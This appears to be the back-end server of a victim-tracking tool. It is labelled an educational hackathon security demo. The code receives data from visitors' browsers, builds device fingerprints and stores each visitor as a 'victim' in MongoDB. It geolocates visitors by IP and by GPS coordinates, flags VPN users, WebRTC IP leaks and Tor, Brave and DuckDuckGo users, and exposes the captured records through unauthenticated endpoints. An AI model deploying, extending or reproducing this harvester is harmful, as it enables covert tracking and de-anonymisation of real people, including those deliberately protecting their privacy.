const express = require('express');
const cors = require('cors');
const { MongoClient, ServerApiVersion } = require('mongodb');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// MongoDB Configuration
const uri = process.env.MONGODB_URI;

if (!uri) {
  console.error('❌ MONGODB_URI no está configurada en las variables de entorno');
  process.exit(1);
}

// Opciones de conexión optimizadas para Node.js 20+
const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  },
  connectTimeoutMS: 30000,
  socketTimeoutMS: 30000,
  serverSelectionTimeoutMS: 30000,
  maxPoolSize: 10,
  minPoolSize: 2,
  retryWrites: true,
  retryReads: true,
  w: 'majority'
});

let victimsCollection;

// ═══════════════════════════════════════
// 🗄️ CACHE SYSTEM PARA GEOLOCALIZACIÓN
// ═══════════════════════════════════════
const locationCache = new Map();
const CACHE_TTL = 3600000; // 1 hora en milisegundos

function getCachedLocation(ip) {
  const cached = locationCache.get(ip);
  if (cached && (Date.now() - cached.timestamp < CACHE_TTL)) {
    console.log(`📦 Cache hit para IP: ${ip}`);
    return cached.data;
  }
  return null;
}

function setCachedLocation(ip, data) {
  locationCache.set(ip, {
    data: data,
    timestamp: Date.now()
  });
  console.log(`💾 IP ${ip} guardada en caché`);
}

// Limpiar caché cada hora
setInterval(() => {
  const now = Date.now();
  for (const [ip, cached] of locationCache.entries()) {
    if (now - cached.timestamp > CACHE_TTL) {
      locationCache.delete(ip);
    }
  }
  console.log(`🧹 Cache limpiado. Entradas activas: ${locationCache.size}`);
}, CACHE_TTL);

// Conectar a MongoDB Atlas
async function connectDB() {
  try {
    await client.connect();
    await client.db("admin").command({ ping: 1 });
    console.log("✅ Conectado a MongoDB Atlas");
    
    const db = client.db('apex-db');
    victimsCollection = db.collection('victims');
    
    // Crear índices
    await victimsCollection.createIndex({ fingerprint: 1 }, { unique: true });
    await victimsCollection.createIndex({ timestamp: -1 });
    console.log("📊 Índices creados en MongoDB");
    
  } catch (error) {
    console.error("❌ Error conectando a MongoDB:", error);
    process.exit(1);
  }
}

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

// Generar fingerprint ENFOCADO EN DATOS MÓVILES (alta tasa de éxito)
function generateFingerprint(data, ip, userAgent) {
  // Priorizar datos que SIEMPRE están disponibles en móviles
  const components = [
    // ✅ SIEMPRE disponible
    userAgent || '',
    ip || '',

    // ✅ MUY ALTA probabilidad (>95%)
    data.screen?.resolution || '',
    data.screen?.colorDepth || '24',
    data.browser?.language || 'en',
    data.timezoneInfo?.timezone || Intl?.DateTimeFormat().resolvedOptions().timeZone || '',

    // ✅ ALTA probabilidad en móviles (>80%)
    data.device?.platform || '',
    data.device?.vendor || '',
    data.device?.maxTouchPoints || '0',

    // ✅ MEDIA probabilidad (>60%)
    data.fingerprints?.canvas || '',
    data.fingerprints?.webglRenderer || '',

    // ✅ Opcional pero útil si está disponible
    data.device?.cpuCores || '',
    data.device?.memory || '',
    (data.fingerprints?.fonts || []).slice(0, 5).join(','), // Solo primeras 5 fonts

    // ✅ Timestamp para garantizar unicidad
    Date.now().toString()
  ].join('|');

  return crypto.createHash('sha256').update(components).digest('hex');
}

// Función para parsear User-Agent
function parseUserAgent(ua) {
  const browser = { name: 'Unknown', version: 'Unknown' };
  const os = { name: 'Unknown', version: 'Unknown', platform: 'Unknown' };

  // Detectar OS
  if (ua.includes('Windows NT 10.0')) os.name = 'Windows 10/11';
  else if (ua.includes('Windows NT 6.3')) os.name = 'Windows 8.1';
  else if (ua.includes('Windows NT 6.2')) os.name = 'Windows 8';
  else if (ua.includes('Windows NT 6.1')) os.name = 'Windows 7';
  else if (ua.includes('Mac OS X')) {
    os.name = 'macOS';
    const match = ua.match(/Mac OS X ([0-9_]+)/);
    if (match) os.version = match[1].replace(/_/g, '.');
  } else if (ua.includes('Android')) {
    os.name = 'Android';
    const match = ua.match(/Android ([0-9.]+)/);
    if (match) os.version = match[1];
  } else if (ua.includes('Linux')) os.name = 'Linux';
  else if (ua.includes('iPhone') || ua.includes('iPad')) {
    os.name = 'iOS';
    const match = ua.match(/OS ([0-9_]+)/);
    if (match) os.version = match[1].replace(/_/g, '.');
  }

  // Detectar Platform
  if (ua.includes('Win')) os.platform = 'Windows';
  else if (ua.includes('Mac')) os.platform = 'MacOS';
  else if (ua.includes('Linux')) os.platform = 'Linux';
  else if (ua.includes('Android')) os.platform = 'Android';
  else if (ua.includes('iPhone') || ua.includes('iPad')) os.platform = 'iOS';

  // Detectar Browser
  if (ua.includes('Edg/')) {
    browser.name = 'Edge';
    const match = ua.match(/Edg\/([0-9.]+)/);
    if (match) browser.version = match[1];
  } else if (ua.includes('Chrome/') && !ua.includes('Edg/')) {
    browser.name = 'Chrome';
    const match = ua.match(/Chrome\/([0-9.]+)/);
    if (match) browser.version = match[1];
  } else if (ua.includes('Firefox/')) {
    browser.name = 'Firefox';
    const match = ua.match(/Firefox\/([0-9.]+)/);
    if (match) browser.version = match[1];
  } else if (ua.includes('Safari/') && !ua.includes('Chrome/')) {
    browser.name = 'Safari';
    const match = ua.match(/Version\/([0-9.]+)/);
    if (match) browser.version = match[1];
  } else if (ua.includes('Opera/') || ua.includes('OPR/')) {
    browser.name = 'Opera';
    const match = ua.match(/(?:Opera|OPR)\/([0-9.]+)/);
    if (match) browser.version = match[1];
  }

  return { browser, os };
}

// Obtener geolocalización precisa desde IP usando ipapi.co (CON CACHÉ)
async function getLocationFromIP(ip) {
    // Si es localhost o IP interna, retornar datos por defecto
    if (ip === '::1' || ip === '127.0.0.1' || ip.startsWith('192.168') || ip.startsWith('10.')) {
        return {
            ip: ip,
            city: 'Local',
            country: 'XX',
            country_name: 'Local Network',
            region: 'Local',
            timezone: 'UTC',
            latitude: 0,
            longitude: 0,
            isp: 'Local',
            source: 'local'
        };
    }

    // ✅ VERIFICAR CACHÉ PRIMERO
    const cached = getCachedLocation(ip);
    if (cached) {
        return { ...cached, fromCache: true };
    }

    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        if (!response.ok) throw new Error('API request failed');

        const data = await response.json();

        // Verificar si la API retornó error
        if (data.error) {
            throw new Error(data.reason || 'API error');
        }

        const locationData = {
            ip: data.ip || ip,
            city: data.city || 'Unknown',
            country: data.country_code || 'Unknown',
            country_name: data.country_name || 'Unknown',
            region: data.region || 'Unknown',
            timezone: data.timezone || 'Unknown',
            latitude: data.latitude || null,
            longitude: data.longitude || null,
            isp: data.org || 'Unknown',
            postal: data.postal || 'Unknown',
            continent: data.continent_code || 'Unknown',
            source: 'ipapi'
        };

        // ✅ GUARDAR EN CACHÉ
        setCachedLocation(ip, locationData);

        return locationData;
    } catch (error) {
        console.error('Error obteniendo geolocalización desde IP:', error);
        // Fallback si falla la API
        return {
            ip: ip,
            city: 'Unknown',
            country: 'Unknown',
            country_name: 'Unknown',
            region: 'Unknown',
            timezone: 'Unknown',
            latitude: null,
            longitude: null,
            isp: 'Unknown',
            source: 'failed'
        };
    }
}

// Obtener ciudad/país desde coordenadas GPS usando reverse geocoding
async function getLocationFromCoordinates(lat, lon) {
    try {
        // Usar Nominatim de OpenStreetMap (gratis, sin límites estrictos)
        const response = await fetch(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=10`,
            {
                headers: {
                    'User-Agent': 'APEX-Security-Demo/1.0'
                }
            }
        );

        if (!response.ok) throw new Error('Geocoding API failed');

        const data = await response.json();
        const address = data.address || {};

        return {
            city: address.city || address.town || address.village || address.municipality || 'Unknown',
            country: address.country_code?.toUpperCase() || 'Unknown',
            country_name: address.country || 'Unknown',
            region: address.state || address.region || 'Unknown',
            postal: address.postcode || 'Unknown',
            latitude: parseFloat(lat),
            longitude: parseFloat(lon),
            source: 'gps'
        };
    } catch (error) {
        console.error('Error en reverse geocoding:', error);
        return null;
    }
}

// Verificar si la víctima ya fue capturada
async function isAlreadyCaptured(fingerprint) {
  try {
    if (!fingerprint) return false;
    const count = await victimsCollection.countDocuments({ fingerprint });
    return count > 0;
  } catch (error) {
    console.error("Error verificando duplicado:", error);
    return false;
  }
}

// Guardar víctima en MongoDB (FIXED VERSION)
async function saveVictim(victimData) {
  try {
    // Validación
    if (!victimData || typeof victimData !== 'object') {
      console.error("❌ Invalid victim data");
      return false;
    }

    if (!victimData.fingerprint || typeof victimData.fingerprint !== 'string') {
      console.error("❌ Missing or invalid fingerprint");
      return false;
    }

    // ✅ FIX: Store values in local variables BEFORE any MongoDB operations
    const fingerprint = victimData.fingerprint;
    const username = victimData.username || 'Unknown';
    const ip = victimData.network?.ip || 'Unknown';
    const city = victimData.network?.city || 'Unknown';
    const country = victimData.network?.country || 'Unknown';
    const isp = victimData.network?.isp || 'Unknown';

    victimData.timestamp = new Date();
    await victimsCollection.insertOne(victimData);

    // ✅ FIX: Use local variables instead of victimData properties
    const fingerprintPreview = fingerprint.substring(0, 8);

    console.log(`🎯 Nueva víctima capturada: ${username} [${fingerprintPreview}...]`);
    console.log(`   🌐 ${ip} | ${city}, ${country} | ISP: ${isp}`);
    return true;
    
  } catch (error) {
    if (error.code === 11000) {
      // ✅ Already had safe optional chaining here
      const fingerprintPreview = victimData.fingerprint?.substring(0, 8) || 'Unknown';
      console.log(`⚠️ Víctima duplicada ignorada: ${fingerprintPreview}...`);
      return false;
    }
    console.error("Error guardando víctima:", error);
    return false;
  }
}

// Obtener todas las víctimas
async function getVictims() {
  try {
    return await victimsCollection.find({}).sort({ timestamp: -1 }).toArray();
  } catch (error) {
    console.error("Error obteniendo víctimas:", error);
    return [];
  }
}

// === ROUTES ===

// Health check
app.get('/', (req, res) => {
  res.json({
    status: 'online',
    server: 'Apex Security Demo',
    version: '3.0.0',
    database: 'MongoDB Atlas ☁️',
    purpose: '⚠️ EDUCATIONAL - Hackathon Security Demonstration',
    timestamp: new Date().toISOString()
  });
});

// Capturar datos de víctima
app.post('/api/capture', async (req, res) => {
  try {
    const data = req.body;
    
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0].trim() || 
                     req.connection.remoteAddress || 
                     req.socket.remoteAddress;

    const userAgent = req.headers['user-agent'] || 'Unknown';

    // Si no hay fingerprint, generarlo
    if (!data.fingerprint) {
      data.fingerprint = generateFingerprint(data, clientIP, userAgent);
      console.log(`🔑 Fingerprint generado: ${data.fingerprint.substring(0, 8)}...`);
    }

    // Verificar fingerprint único
    if (await isAlreadyCaptured(data.fingerprint)) {
      return res.json({ 
        success: false, 
        message: 'Duplicate fingerprint detected',
        duplicate: true 
      });
    }

    // Enriquecer con datos de geolocalización
    // Primero intentar con IP
    let geo = await getLocationFromIP(clientIP);

    // ✅ DETECCIÓN DE VPN/PROXY MEJORADA
    const vpnDetection = {
      timezoneMismatch: false,
      webRTCLeak: false,
      suspiciousISP: false,
      likelyVPN: false,
      confidence: 'low' // low, medium, high
    };

    // 1. Verificar mismatch entre timezone del navegador y ubicación de IP
    if (data.timezoneInfo?.timezone && geo.timezone && geo.timezone !== 'Unknown' && geo.timezone !== 'UTC') {
      const browserTZ = data.timezoneInfo.timezone;
      const ipTZ = geo.timezone;

      // Comparar solo si ambos están disponibles y no son default
      if (browserTZ && ipTZ && browserTZ !== ipTZ && browserTZ !== 'UTC') {
        vpnDetection.timezoneMismatch = true;
        vpnDetection.confidence = 'high';
        console.log(`⚠️ Timezone mismatch detectado: Browser=${browserTZ}, IP=${ipTZ}`);
      }
    }

    // 2. Verificar WebRTC leak (IP pública diferente a la IP del request)
    if (data.webRTC?.publicIP &&
        data.webRTC.publicIP !== 'Unknown' &&
        data.webRTC.publicIP !== 'Error' &&
        data.webRTC.publicIP !== clientIP &&
        !data.webRTC.publicIP.startsWith('192.168') &&
        !data.webRTC.publicIP.startsWith('10.')) {

      vpnDetection.webRTCLeak = true;
      vpnDetection.confidence = 'high';
      console.log(`⚠️ WebRTC leak detectado: WebRTC IP=${data.webRTC.publicIP}, Request IP=${clientIP}`);
    }

    // 3. ISPs conocidos de VPN/Hosting
    const vpnISPs = [
      'digitalocean', 'amazon', 'google cloud', 'azure', 'linode',
      'vultr', 'ovh', 'hetzner', 'vpn', 'proxy', 'datacenter',
      'hosting', 'cloudflare', 'akamai'
    ];

    if (geo.isp && typeof geo.isp === 'string') {
      const ispLower = geo.isp.toLowerCase();
      if (vpnISPs.some(vpn => ispLower.includes(vpn))) {
        vpnDetection.suspiciousISP = true;
        if (vpnDetection.confidence === 'low') vpnDetection.confidence = 'medium';
        console.log(`⚠️ ISP sospechoso de VPN: ${geo.isp}`);
      }
    }

    // 4. Determinar si probablemente es VPN
    // Alta confianza: WebRTC leak + timezone mismatch
    // Media confianza: Uno de los dos anteriores
    // Baja confianza: Solo ISP sospechoso
    if (vpnDetection.webRTCLeak && vpnDetection.timezoneMismatch) {
      vpnDetection.likelyVPN = true;
      vpnDetection.confidence = 'high';
    } else if (vpnDetection.webRTCLeak || vpnDetection.timezoneMismatch) {
      vpnDetection.likelyVPN = true;
      vpnDetection.confidence = vpnDetection.webRTCLeak ? 'high' : 'medium';
    } else if (vpnDetection.suspiciousISP) {
      vpnDetection.likelyVPN = true;
      vpnDetection.confidence = 'low';
    }

    // Si la API de IP falló o retornó Unknown Y tenemos coordenadas GPS del usuario
    if ((geo.source === 'failed' || geo.city === 'Unknown') &&
        data.geolocation?.latitude &&
        data.geolocation?.longitude) {

      console.log(`🌍 Intentando reverse geocoding desde GPS (${data.geolocation.latitude}, ${data.geolocation.longitude})`);

      const gpsLocation = await getLocationFromCoordinates(
        data.geolocation.latitude,
        data.geolocation.longitude
      );

      if (gpsLocation) {
        // Usar datos del GPS en lugar de la IP
        geo = {
          ip: geo.ip, // Mantener IP
          isp: geo.isp, // Mantener ISP si lo tenemos
          timezone: geo.timezone, // Mantener timezone si lo tenemos
          ...gpsLocation // Sobrescribir con datos del GPS
        };
        console.log(`✅ Ubicación obtenida desde GPS: ${geo.city}, ${geo.country}`);
      }
    }

    // Crear objeto network completo con todos los datos
    const networkData = {
      ip: geo.ip,
      country: geo.country,
      country_name: geo.country_name,
      city: geo.city,
      region: geo.region,
      timezone: geo.timezone,
      latitude: geo.latitude,
      longitude: geo.longitude,
      isp: geo.isp,
      postal: geo.postal || 'Unknown',
      continent: geo.continent || 'Unknown',
      connectionType: data.network?.effectiveType || 'Unknown',
      downlink: data.network?.downlink || 'Unknown',
      rtt: data.network?.rtt || 'Unknown',
      saveData: data.network?.saveData || false,
      locationSource: geo.source || 'unknown', // Indicar de dónde viene la ubicación
      vpnDetection: vpnDetection // ✅ NUEVO: Detección de VPN/Proxy
    };

    data.network = networkData;

    // Parsear User-Agent
    const { browser, os } = parseUserAgent(userAgent);

    if (!data.browser) data.browser = {};
    data.browser.name = browser.name;
    data.browser.version = browser.version;
    data.browser.userAgent = userAgent;

    if (!data.os) data.os = {};
    data.os.name = os.name;
    data.os.version = os.version;
    data.os.platform = os.platform;

    // ✅ DETECTAR TIPO DE DISPOSITIVO
    if (!data.device) data.device = {};

    const isMobile = /mobile|android|iphone|ipod|blackberry|iemobile|opera mini/i.test(userAgent);
    const isTablet = /tablet|ipad|playbook|silk/i.test(userAgent);
    const isDesktop = !isMobile && !isTablet;

    data.device.type = isTablet ? 'Tablet' : (isMobile ? 'Mobile' : 'Desktop');
    data.device.isMobile = isMobile;
    data.device.isTablet = isTablet;
    data.device.isDesktop = isDesktop;

    // Detectar si es un bot
    const botPatterns = /bot|crawler|spider|crawling|slurp|baidu|bing|google|yahoo/i;
    data.device.isBot = botPatterns.test(userAgent);

    // Detectar headless browser (usado en automatización)
    data.device.isHeadless = userAgent.includes('HeadlessChrome') ||
                             userAgent.includes('PhantomJS') ||
                             (data.browser?.plugins && data.browser.plugins.length === 0 && !isMobile);

    // 🦆 DETECTAR NAVEGADORES DE PRIVACIDAD
    if (!data.privacyBrowser) {
      data.privacyBrowser = {
        isDuckDuckGo: userAgent.includes('DuckDuckGo') || userAgent.includes('ddg'),
        isBrave: userAgent.includes('Brave'),
        isTor: userAgent.includes('Tor'),
        privacyFeatures: [],
        antiTrackingScore: 0
      };

      // Calcular score basado en características detectadas
      if (data.privacyBrowser.isDuckDuckGo) {
        data.privacyBrowser.privacyFeatures.push('DuckDuckGo Browser');
        data.privacyBrowser.antiTrackingScore += 30;
      }
      if (data.privacyBrowser.isBrave) {
        data.privacyBrowser.privacyFeatures.push('Brave Browser');
        data.privacyBrowser.antiTrackingScore += 35;
      }
      if (data.privacyBrowser.isTor) {
        data.privacyBrowser.privacyFeatures.push('Tor Browser');
        data.privacyBrowser.antiTrackingScore += 50;
      }
    }

    // Log especial para navegadores de privacidad
    if (data.privacyBrowser?.isDuckDuckGo || data.privacyBrowser?.isBrave || data.privacyBrowser?.isTor) {
      console.log(`🦆 Navegador de privacidad detectado: ${data.privacyBrowser.privacyFeatures.join(', ')}`);
      console.log(`   📊 Anti-Tracking Score: ${data.privacyBrowser.antiTrackingScore}/100`);

      // Tor Browser específico
      if (data.privacyBrowser.isTor) {
        console.log(`   🧅 Tor Browser confirmado (Confianza: ${data.privacyBrowser.torConfidence || 100}%)`);

        // Tor bloqueará WebRTC, pero intentamos detectar la IP de salida del nodo Tor
        if (data.webRTC?.blocked) {
          console.log(`   🔒 WebRTC bloqueado (esperado en Tor)`);
          console.log(`   🌐 IP del nodo Tor de salida: ${clientIP}`);
        }

        // Timezone en Tor siempre será UTC
        if (data.timezoneInfo?.timezone === 'UTC') {
          console.log(`   🕐 Timezone UTC confirmado (Tor protection activa)`);
        }

        // Fingerprints capturados incluso en Tor
        if (data.fingerprints?.advancedCanvas?.hash) {
          console.log(`   🎨 Canvas Hash capturado: ${data.fingerprints.advancedCanvas.hash} (único por sesión)`);
        }

        if (data.screen?.isTorResolution) {
          console.log(`   🖥️ Resolución Tor detectada: ${data.screen.resolution} (redondeada)`);
        }

        if (data.extensions?.detected && data.extensions.detected.length > 0) {
          console.log(`   🔌 Extensiones detectadas: ${data.extensions.detected.join(', ')}`);
        }

        // Comportamiento capturado
        if (data.behavior) {
          console.log(`   🖱️ Comportamiento: ${data.behavior.clicks} clicks, ${data.behavior.mouseMovements} movimientos, ${data.behavior.timeOnPage}s`);
        }
      } else {
        // Otros navegadores de privacidad
        if (data.webRTC?.publicIP && data.webRTC.publicIP !== 'Unknown' && data.webRTC.publicIP !== 'Error' && data.webRTC.publicIP !== 'Blocked') {
          console.log(`   🌐 WebRTC IP capturada: ${data.webRTC.publicIP} (bypass privacidad)`);
        } else if (data.webRTC?.blocked) {
          console.log(`   🔒 WebRTC bloqueado por navegador`);
        }

        if (data.timezoneInfo?.timezone) {
          console.log(`   🕐 Timezone real: ${data.timezoneInfo.timezone}`);
        }
      }
    }

    // Guardar en MongoDB
    const saved = await saveVictim(data);
    
    if (saved) {
      res.json({ 
        success: true, 
        message: 'Data captured successfully',
        victimId: data.fingerprint.substring(0, 8)
      });
    } else {
      res.json({ 
        success: false, 
        message: 'Failed to save data' 
      });
    }

  } catch (error) {
    console.error('Error en /api/capture:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Internal server error',
      details: error.message
    });
  }
});

// Obtener estadísticas
app.get('/api/stats', async (req, res) => {
  try {
    const victims = await getVictims();
    
    const stats = {
      totalVictims: victims.length,
      lastCapture: victims.length > 0 ? victims[0].timestamp : null,
      uniqueCountries: [...new Set(victims.map(v => v.network?.country).filter(Boolean))].length,
      browsers: {},
      operatingSystems: {},
      devices: {},
      recentVictims: victims.slice(0, 5).map(v => ({
        username: v.username || 'Unknown',
        timestamp: v.timestamp,
        country: v.network?.country || 'Unknown',
        browser: v.browser?.name || 'Unknown',
        os: v.os?.name || 'Unknown'
      }))
    };

    // Contar browsers
    victims.forEach(v => {
      const browser = v.browser?.name || 'Unknown';
      stats.browsers[browser] = (stats.browsers[browser] || 0) + 1;
    });

    // Contar OS
    victims.forEach(v => {
      const os = v.os?.name || 'Unknown';
      stats.operatingSystems[os] = (stats.operatingSystems[os] || 0) + 1;
    });

    // Contar dispositivos
    victims.forEach(v => {
      const device = v.device?.type || 'Unknown';
      stats.devices[device] = (stats.devices[device] || 0) + 1;
    });

    res.json(stats);
  } catch (error) {
    console.error('Error en /api/stats:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Obtener todas las víctimas
app.get('/api/victims', async (req, res) => {
  try {
    const victims = await getVictims();
    res.json(victims);
  } catch (error) {
    console.error('Error en /api/victims:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Limpiar todas las víctimas (para testing)
app.delete('/api/clear', async (req, res) => {
  try {
    const result = await victimsCollection.deleteMany({});
    console.log(`🗑️ Base de datos limpiada: ${result.deletedCount} víctimas eliminadas`);
    res.json({
      success: true,
      message: `${result.deletedCount} victims cleared`,
      deletedCount: result.deletedCount
    });
  } catch (error) {
    console.error('Error en /api/clear:', error);
    res.status(500).json({
      success: false,
      error: 'Internal server error'
    });
  }
});

// ✅ MIGRAR/ACTUALIZAR REGISTROS ANTIGUOS
app.post('/api/migrate', async (req, res) => {
  try {
    console.log('🔄 Iniciando migración de datos...');

    const allVictims = await victimsCollection.find({}).toArray();
    let updated = 0;
    let errors = 0;

    for (const victim of allVictims) {
      try {
        const updates = {};
        let needsUpdate = false;

        // 1. Asegurar que device.type existe
        if (!victim.device?.type) {
          const ua = victim.browser?.userAgent || '';
          const isMobile = /mobile|android|iphone|ipod|blackberry|iemobile|opera mini/i.test(ua);
          const isTablet = /tablet|ipad|playbook|silk/i.test(ua);

          updates['device.type'] = isTablet ? 'Tablet' : (isMobile ? 'Mobile' : 'Desktop');
          updates['device.isMobile'] = isMobile;
          updates['device.isTablet'] = isTablet;
          updates['device.isDesktop'] = !isMobile && !isTablet;
          needsUpdate = true;
        }

        // 2. Detectar bots si no existe
        if (victim.device?.isBot === undefined) {
          const ua = victim.browser?.userAgent || '';
          const botPatterns = /bot|crawler|spider|crawling|slurp|baidu|bing|google|yahoo/i;
          updates['device.isBot'] = botPatterns.test(ua);
          needsUpdate = true;
        }

        // 3. Re-evaluar VPN detection si está desactualizado o mal configurado
        if (!victim.network?.vpnDetection || !victim.network.vpnDetection.confidence) {
          const vpnDetection = {
            timezoneMismatch: false,
            webRTCLeak: false,
            suspiciousISP: false,
            likelyVPN: false,
            confidence: 'low'
          };

          // Timezone mismatch
          if (victim.timezoneInfo?.timezone && victim.network?.timezone &&
              victim.network.timezone !== 'Unknown' && victim.network.timezone !== 'UTC') {
            if (victim.timezoneInfo.timezone !== victim.network.timezone &&
                victim.timezoneInfo.timezone !== 'UTC') {
              vpnDetection.timezoneMismatch = true;
              vpnDetection.confidence = 'high';
            }
          }

          // WebRTC leak
          const clientIP = victim.network?.ip;
          if (victim.webRTC?.publicIP &&
              victim.webRTC.publicIP !== 'Unknown' &&
              victim.webRTC.publicIP !== 'Error' &&
              victim.webRTC.publicIP !== clientIP &&
              !victim.webRTC.publicIP.startsWith('192.168') &&
              !victim.webRTC.publicIP.startsWith('10.')) {
            vpnDetection.webRTCLeak = true;
            vpnDetection.confidence = 'high';
          }

          // ISP sospechoso
          const vpnISPs = [
            'digitalocean', 'amazon', 'google cloud', 'azure', 'linode',
            'vultr', 'ovh', 'hetzner', 'vpn', 'proxy', 'datacenter',
            'hosting', 'cloudflare', 'akamai'
          ];

          if (victim.network?.isp && typeof victim.network.isp === 'string') {
            const ispLower = victim.network.isp.toLowerCase();
            if (vpnISPs.some(vpn => ispLower.includes(vpn))) {
              vpnDetection.suspiciousISP = true;
              if (vpnDetection.confidence === 'low') vpnDetection.confidence = 'medium';
            }
          }

          // Determinar likelyVPN
          if (vpnDetection.webRTCLeak && vpnDetection.timezoneMismatch) {
            vpnDetection.likelyVPN = true;
            vpnDetection.confidence = 'high';
          } else if (vpnDetection.webRTCLeak || vpnDetection.timezoneMismatch) {
            vpnDetection.likelyVPN = true;
            vpnDetection.confidence = vpnDetection.webRTCLeak ? 'high' : 'medium';
          } else if (vpnDetection.suspiciousISP) {
            vpnDetection.likelyVPN = true;
            vpnDetection.confidence = 'low';
          }

          updates['network.vpnDetection'] = vpnDetection;
          needsUpdate = true;
        }

        // 4. Agregar behavior.touches y swipes si no existen
        if (victim.behavior && !victim.behavior.touches) {
          updates['behavior.touches'] = 0;
          updates['behavior.swipes'] = 0;
          needsUpdate = true;
        }

        // 5. Agregar locationSource si no existe
        if (victim.network && !victim.network.locationSource) {
          if (victim.geolocation?.latitude && victim.geolocation?.longitude) {
            updates['network.locationSource'] = 'gps';
          } else {
            updates['network.locationSource'] = 'ipapi';
          }
          needsUpdate = true;
        }

        // Aplicar actualizaciones si hay cambios
        if (needsUpdate) {
          await victimsCollection.updateOne(
            { _id: victim._id },
            { $set: updates }
          );
          updated++;
        }

      } catch (error) {
        console.error(`Error migrando victim ${victim._id}:`, error);
        errors++;
      }
    }

    console.log(`✅ Migración completada: ${updated} registros actualizados, ${errors} errores`);

    res.json({
      success: true,
      message: 'Migration completed',
      totalRecords: allVictims.length,
      updated: updated,
      errors: errors,
      unchanged: allVictims.length - updated - errors
    });

  } catch (error) {
    console.error('Error en /api/migrate:', error);
    res.status(500).json({
      success: false,
      error: 'Migration failed',
      details: error.message
    });
  }
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  res.status(500).json({ 
    success: false, 
    error: 'Internal server error',
    details: err.message 
  });
});

// Manejo de cierre graceful
process.on('SIGINT', async () => {
  console.log('\n🛑 Cerrando servidor...');
  try {
    await client.close();
    console.log('✅ Conexión a MongoDB cerrada');
    process.exit(0);
  } catch (error) {
    console.error('❌ Error cerrando MongoDB:', error);
    process.exit(1);
  }
});

process.on('SIGTERM', async () => {
  console.log('\n🛑 SIGTERM recibido, cerrando servidor...');
  try {
    await client.close();
    console.log('✅ Conexión a MongoDB cerrada');
    process.exit(0);
  } catch (error) {
    console.error('❌ Error cerrando MongoDB:', error);
    process.exit(1);
  }
});

// Iniciar servidor
async function startServer() {
  await connectDB();
  app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
    console.log(`🌐 Entorno: ${process.env.NODE_ENV || 'development'}`);
    console.log(`⚠️  PROPÓSITO: Demostración educativa de seguridad`);
  });
}

startServer().catch(error => {
  console.error('❌ Error iniciando servidor:', error);
  process.exit(1);
});